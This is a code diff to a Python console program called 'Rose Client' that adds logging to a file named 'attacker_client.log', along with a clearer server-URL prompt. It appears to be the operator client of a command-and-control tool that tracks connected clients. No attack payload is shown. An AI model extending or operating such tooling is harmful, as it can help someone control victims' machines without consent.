@@ -17,7 +17,19 @@ __version__ = "1.0"
 #    config = json.load(f)
 #    server_url = config["server_url"]
 
-server_url = Write.Input("    .$ Your server URL ? ", Colors.red_to_white, interval=0.025)
+import logging
+
+logging.basicConfig(
+    level=logging.DEBUG,
+    filename='attacker_client.log',
+    filemode='a',
+    format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
+)
+
+logger = logging.getLogger(__name__)
+
+server_url = Write.Input("    .$ Your server URL ? (should contains https://)", Colors.red_to_white, interval=0.025)
+logger.info(f"Attacker using URL {server_url}")
 
 os.system('cls')
 ctypes.windll.kernel32.SetConsoleTitleW(f"Rose Client | v{__version__}")
@@ -92,6 +104,7 @@ class Connected():
         self.client_connected = number
         
     def get(self):
+        logger.debug(f"Getting number of connected clients: {self.client_connected}")
         return self.client_connected
 
 class Serv():
@@ -116,6 +129,7 @@ class Serv():
         self.loop()
                 
     def not_valid(self, cmd):
+        logger.error(f"{cmd} - invalid command")
         print(Colorate.Horizontal(Colors.red_to_white, f"    .X {cmd} is not a valid command. Type 'help' for more info."))
         time.sleep(2)
         self.home()
